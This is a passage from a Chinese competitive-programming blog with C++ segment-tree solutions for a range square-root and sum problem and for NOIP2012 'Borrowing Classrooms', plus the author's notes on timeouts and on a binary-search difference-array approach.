&#125; <span class="keyword">else</span> &#123;</div><div class="line">            is_same[rt] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        sum[rt] = sum[rt &lt;&lt; <span class="number">1</span>] + sum[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">void</span> push_down(<span class="keyword">int</span> rt, <span class="keyword">int</span> l, <span class="keyword">int</span> r) &#123;</div><div class="line">        <span class="keyword">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span>(is_same[rt]) &#123;</div><div class="line">            is_same[rt &lt;&lt; <span class="number">1</span>] = is_same[rt];</div><div class="line">            is_same[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] = is_same[rt];</div><div class="line">            sum[rt &lt;&lt; <span class="number">1</span>] = is_same[rt] * (m - l + <span class="number">1</span>);</div><div class="line">            sum[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] = is_same[rt] * (r - m);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            lazy[rt &lt;&lt; <span class="number">1</span>] += lazy[rt];</div><div class="line">            lazy[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] += lazy[rt];</div><div class="line">            sum[rt &lt;&lt; <span class="number">1</span>] += lazy[rt] * (m - l + <span class="number">1</span>);</div><div class="line">            sum[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] += lazy[rt] * (r - m);</div><div class="line">            lazy[rt] = <span class="number">0</span>;</div><div class="line">            <span class="keyword">if</span>(is_same[rt &lt;&lt; <span class="number">1</span>]) &#123;</div><div class="line">                is_same[rt &lt;&lt; <span class="number">1</span>] += lazy[rt &lt;&lt; <span class="number">1</span>];</div><div class="line">                lazy[rt &lt;&lt; <span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(is_same[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]) &#123;</div><div class="line">                is_same[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] += lazy[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</div><div class="line">                lazy[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">void</span> build(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt) &#123;</div><div class="line">        <span class="keyword">if</span>(l == r) &#123;</div><div class="line">            sum[rt] = A[l];</div><div class="line">            is_same[rt] = A[l];</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">        build(lson);</div><div class="line">        build(rson);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">void</span> update1(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> x, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt) &#123;</div><div class="line">        <span class="keyword">if</span>(L &lt;= l &amp;&amp; r &lt;= R) &#123;</div><div class="line">            sum[rt] += (ll)x * (r - l + <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span>(is_same[rt]) &#123;</div><div class="line">                is_same[rt] += x;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                lazy[rt] += x;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">        push_down(rt, l, r);</div><div class="line">        <span class="keyword">if</span>(m &gt;= L) update1(L, R, x, lson);</div><div class="line">        <span class="keyword">if</span>(m &lt; R) update1(L, R, x, rson);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">void</span> update2(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt) &#123;</div><div class="line">        <span class="keyword">if</span>(L &lt;= l &amp;&amp; r &lt;= R &amp;&amp; is_same[rt]) &#123;</div><div class="line">            is_same[rt] = sqrt(is_same[rt]);</div><div class="line">            sum[rt] = is_same[rt] * (r - l + <span class="number">1</span>);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">        push_down(rt, l, r);</div><div class="line">        <span class="keyword">if</span>(m &gt;= L) update2(L, R, lson);</div><div class="line">        <span class="keyword">if</span>(m &lt; R) update2(L, R, rson);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    ll query(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt) &#123;</div><div class="line">        <span class="keyword">if</span>(L &lt;= l &amp;&amp; r &lt;= R) &#123;</div><div class="line">            <span class="keyword">return</span> sum[rt];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">        push_down(rt, l, r);</div><div class="line">        ll res = <span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span>(m &gt;= L) res += query(L, R, lson);</div><div class="line">        <span class="keyword">if</span>(m &lt;  R) res += query(L, R, rson);</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125;</div><div class="line">&#125;seg;</div><div class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>) &#123;</div><div class="line"><span class="meta">#ifdef MATHON</span></div><div class="line">    <span class="comment">//freopen("in.txt", "r", stdin);</span></div><div class="line">    <span class="comment">//freopen("out.txt", "w", stdout);</span></div><div class="line"><span class="meta">#endif</span></div><div class="line">    <span class="keyword">int</span> T; scanf(<span class="string">"%d"</span>, &amp;T);</div><div class="line">    <span class="keyword">while</span>(T--) &#123;</div><div class="line">        <span class="keyword">int</span> n, m;</div><div class="line">        scanf(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</div><div class="line">        seg.init();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            scanf(<span class="string">"%d"</span>, &amp;A[i]);</div><div class="line">        &#125;</div><div class="line">        seg.build(<span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</div><div class="line">            <span class="keyword">int</span> op;</div><div class="line">            scanf(<span class="string">"%d"</span>, &amp;op);</div><div class="line">            <span class="keyword">if</span>(op == <span class="number">1</span>) &#123;</div><div class="line">                <span class="keyword">int</span> l, r, x;</div><div class="line">                scanf(<span class="string">"%d%d%d"</span>, &amp;l, &amp;r, &amp;x);</div><div class="line">                seg.update1(l, r, x, <span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == <span class="number">2</span>) &#123;</div><div class="line">                <span class="keyword">int</span> l, r;</div><div class="line">                scanf(<span class="string">"%d%d"</span>, &amp;l, &amp;r);</div><div class="line">                seg.update2(l, r, <span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == <span class="number">3</span>) &#123;</div><div class="line">                <span class="keyword">int</span> l, r;</div><div class="line">                scanf(<span class="string">"%d%d"</span>, &amp;l, &amp;r);</div><div class="line">                ll res = seg.query(l, r, <span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">                printf(<span class="string">"%lld\n"</span>, res);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这个用到了记录相等的一段，这样就不用每次更新到叶子了。<br>赛后题库里的数据加强了，我用这种方法T了好几遍只好去找新的姿势了。。。</p><p>应该考虑一下记相等到底有什么作用。<br>实际上就是把区间开根号变成了类似于区间增减的东西，然后就可以 lazy-tag。<br>所以用一种奇怪的姿势（反正我是想不出来。。。）<br>对于一个区间，可以分为三种情况：</p><ul><li>区间内所有数相等</li><li>区间内极差大于1</li><li>区间内极差等于1</li></ul><p>情况1开根号相当于区间增减。<br>情况2会转化成3或者1。<br>情况3，开根号后极差可能相等，转化为情况1。<br>如果仍然差一，此时显然区间所有数减去了相同的值。</p><p>又是改了一遍才过。。。OTZ<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include &lt;cstdio&gt;</span></div><div class="line"><span class="meta">#include &lt;cstring&gt;</span></div><div class="line"><span class="meta">#include &lt;cmath&gt;</span></div><div class="line"><span class="meta">#include &lt;algorithm&gt;</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l,m,rt&lt;&lt;1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m+1,r,rt&lt;&lt;1|1</span></div><div class="line">typedef <span class="keyword">long</span> <span class="keyword">long</span> llint;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e5</span>+<span class="number">5</span>;</div><div class="line">llint <span class="keyword">add</span>[N&lt;&lt;<span class="number">2</span>],sum[N&lt;&lt;<span class="number">2</span>];</div><div class="line">llint mav[N&lt;&lt;<span class="number">2</span>],miv[N&lt;&lt;<span class="number">2</span>];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_up</span>(<span class="params"><span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    sum[rt]=sum[rt&lt;&lt;<span class="number">1</span>]+sum[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</div><div class="line">    mav[rt]=max(mav[rt&lt;&lt;<span class="number">1</span>],mav[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]);</div><div class="line">    miv[rt]=min(miv[rt&lt;&lt;<span class="number">1</span>],miv[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span>(<span class="params"><span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">add</span>[rt]) &#123;</div><div class="line">        <span class="keyword">add</span>[rt&lt;&lt;<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        <span class="keyword">add</span>[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        mav[rt&lt;&lt;<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        mav[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        miv[rt&lt;&lt;<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        miv[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=<span class="keyword">add</span>[rt];</div><div class="line">        <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        sum[rt&lt;&lt;<span class="number">1</span>]+=<span class="keyword">add</span>[rt]*(m-l+<span class="number">1</span>);</div><div class="line">        sum[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=<span class="keyword">add</span>[rt]*(r-m);</div><div class="line">        <span class="keyword">add</span>[rt]=<span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span>(<span class="params"><span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l==r) &#123;</div><div class="line">        scanf(<span class="string">"%I64d"</span>,&amp;sum[rt]);</div><div class="line">        mav[rt]=miv[rt]=sum[rt];</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    build(lson);</div><div class="line">    build(rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> d,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">        <span class="keyword">add</span>[rt]+=d;</div><div class="line">        mav[rt]+=d;</div><div class="line">        miv[rt]+=d;</div><div class="line">        sum[rt]+=(llint)d*(r-l+<span class="number">1</span>);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    push_down(rt,l,r);</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) update(L,R,d,lson);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) update(L,R,d,rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update2</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">        <span class="keyword">if</span> (mav[rt]==miv[rt]) &#123;</div><div class="line">            llint tmp=sqrt(mav[rt]);</div><div class="line">            <span class="keyword">add</span>[rt]+=tmp-mav[rt];</div><div class="line">            sum[rt]+=(llint)(tmp-mav[rt])*(r-l+<span class="number">1</span>);</div><div class="line">            mav[rt]=miv[rt]=tmp;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> (<span class="params">mav[rt]==miv[rt]+<span class="number">1</span></span>) </span>&#123;</div><div class="line">            llint t1=sqrt(mav[rt]);</div><div class="line">            llint t2=sqrt(miv[rt]);</div><div class="line">            <span class="keyword">if</span> (t1==t2+<span class="number">1</span>) &#123;</div><div class="line">                <span class="keyword">add</span>[rt]+=t1-mav[rt];</div><div class="line">                sum[rt]+=(llint)(t1-mav[rt])*(r-l+<span class="number">1</span>);</div><div class="line">                mav[rt]=t1;</div><div class="line">                miv[rt]=t2;</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    push_down(rt,l,r);</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) update2(L,R,lson);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) update2(L,R,rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function">llint <span class="title">query</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">        <span class="keyword">return</span> sum[rt];</div><div class="line">    &#125;</div><div class="line">    push_down(rt,l,r);</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    llint res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) res+=query(L,R,lson);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) res+=query(L,R,rson);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    memset(<span class="keyword">add</span>,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">add</span>));</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        init();</div><div class="line">        build(<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> k,l,r,x;</div><div class="line">        <span class="keyword">while</span> (m--) &#123;</div><div class="line">            scanf(<span class="string">"%d%d%d"</span>,&amp;k,&amp;l,&amp;r);</div><div class="line">            <span class="keyword">if</span> (k==<span class="number">1</span>) &#123;</div><div class="line">                scanf(<span class="string">"%d"</span>,&amp;x);</div><div class="line">                update(l,r,x,<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line">            &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> (<span class="params">k==<span class="number">2</span></span>) </span>&#123;</div><div class="line">                update2(l,r,<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                printf(<span class="string">"%I64d\n"</span>,query(l,r,<span class="number">1</span>,n,<span class="number">1</span>));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>啥？你说复杂度？<br>我怎么知道= =</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>NOIP2012 借教室(classroom)</title>
      <url>/blog/2016/08/19/codevs1217/</url>
      <content type="html"><![CDATA[<p><a href="http://codevs.cn/problem/1217/" target="_blank" rel="noopener">http://codevs.cn/problem/1217/</a><br>唉。。。即使是以我四年后的水平也要改一遍。。。<br>太菜了。。。<br>应该是目前最常用的线段树写法。。。确实是能过的</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include &lt;iostream&gt;</span></div><div class="line"><span class="meta">#include &lt;cstdio&gt;</span></div><div class="line"><span class="meta">#include &lt;cstring&gt;</span></div><div class="line"><span class="meta">#include &lt;algorithm&gt;</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e6</span>;</div><div class="line"><span class="keyword">int</span> lazy[<span class="number">4</span>*N],mv[<span class="number">4</span>*N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span>(<span class="params"><span class="keyword">int</span> &amp;x</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> c=getchar();</div><div class="line">x=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (!(c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>||c==<span class="string">'-'</span>)) c=getchar();</div><div class="line"><span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (c==<span class="string">'-'</span>) &#123;</div><div class="line">f=<span class="number">1</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> (c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>) &#123;</div><div class="line">x=x*<span class="number">10</span>+c-<span class="string">'0'</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (f) x=-x;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l,m,rt&lt;&lt;1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m+1,r,rt&lt;&lt;1|1</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_up</span>(<span class="params"><span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">mv[rt]=min(mv[rt&lt;&lt;<span class="number">1</span>],mv[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span>(<span class="params"><span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (l==r) &#123;</div><div class="line">read(mv[rt]);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">build(lson);</div><div class="line">build(rson);</div><div class="line">push_up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span>(<span class="params"><span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">lazy[rt&lt;&lt;<span class="number">1</span>]+=lazy[rt];</div><div class="line">mv[rt&lt;&lt;<span class="number">1</span>]+=lazy[rt];</div><div class="line">lazy[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=lazy[rt];</div><div class="line">mv[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=lazy[rt];</div><div class="line">lazy[rt]=<span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">update</span>(<span class="params"><span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt,<span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> del</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">lazy[rt]+=del;</div><div class="line">mv[rt]+=del;</div><div class="line"><span class="keyword">if</span> (mv[rt]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line">push_down(rt);</div><div class="line"><span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line"><span class="keyword">bool</span> res=<span class="literal">true</span>;</div><div class="line"><span class="keyword">if</span> (L&lt;=m) res&amp;=update(lson,L,R,del);</div><div class="line"><span class="keyword">if</span> (!res) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"><span class="keyword">if</span> (m&lt;R) res&amp;=update(rson,L,R,del);</div><div class="line">push_up(rt);</div><div class="line"><span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; i++) &#123;</div><div class="line"><span class="keyword">int</span> d,s,t;</div><div class="line">read(d);</div><div class="line">read(s);</div><div class="line">read(t);</div><div class="line"><span class="keyword">if</span> (!update(<span class="number">1</span>,n,<span class="number">1</span>,s,t,-d)) <span class="keyword">return</span> i;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> m+<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">read(n);</div><div class="line">read(m);</div><div class="line">build(<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line"><span class="keyword">int</span> ans=check();</div><div class="line"><span class="keyword">if</span> (ans&gt;m) puts(<span class="string">"0"</span>);</div><div class="line"><span class="function"><span class="keyword">else</span> <span class="title">printf</span>(<span class="params"><span class="string">"-1\n%d\n"</span>,ans</span>)</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>下面介绍一种据说是正解的方法（不超纲的方法）：<br>二分答案，判断的时候用差分的思想。<br>差分……差分你懂吧？</p><p>好巧啊，我也不懂……<br>引用一下别人的解释：<br><img src="http://img.blog.csdn.net/20160819101342508" alt=""><br>懂了吧……</p><p>mdzz  看代码吧！<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span 